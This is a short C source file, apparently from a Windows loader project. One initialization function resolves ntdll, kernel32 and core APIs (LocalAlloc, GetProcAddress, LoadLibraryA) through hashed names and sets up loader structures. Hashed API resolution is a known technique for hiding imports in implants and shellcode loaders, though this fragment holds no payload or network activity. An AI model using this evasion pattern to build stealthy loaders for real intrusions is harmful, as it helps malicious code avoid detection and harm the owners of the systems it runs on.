#include "../../includes/core/core.h"
#include "../../includes/api/apis.h"


BOOL LdrAllocateCoreStructsAndLoadApis() {
	HMODULE ntdll = GetModule(HASHED_ntdll);
	HMODULE kernel32 = GetModule(HASHED_kernel32);


	pLocalAlloc fnLocalAlloc = (pLocalAlloc)GetProc(kernel32, HASHED_LocalAlloc);
	if(!fnLocalAlloc)
		return FALSE;

	ldr = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(LdrInstance));
	if(!ldr)
		return FALSE;
	ldr->win32 = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Win32));
	ldr->modules = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Modules));
	ldr->config = fnLocalAlloc(LMEM_FIXED | LMEM_ZEROINIT, sizeof(Config));
	if(!ldr->win32 || !ldr->modules || !ldr->config)
		return FALSE;
	ldr->win32->LocalAlloc = fnLocalAlloc;

	ldr->modules->ntdll    = ntdll;
	ldr->modules->kernel32 = kernel32;

	ldr->win32->GetProcAddress = (pGetProcAddress)GetProc(kernel32, HASHED_GetProcAddress);
	ldr->win32->LoadLibraryA = (pLoadLibraryA)GetProc(kernel32, HASHED_LoadLibraryA);
	ldr->win32->LocalFree = (pLocalFree)GetProc(kernel32, HASHED_LocalFree);
	ldr->win32->LocalReAlloc = (pLocalReAlloc)GetProc(kernel32, HASHED_LocalReAlloc);

	return TRUE;
}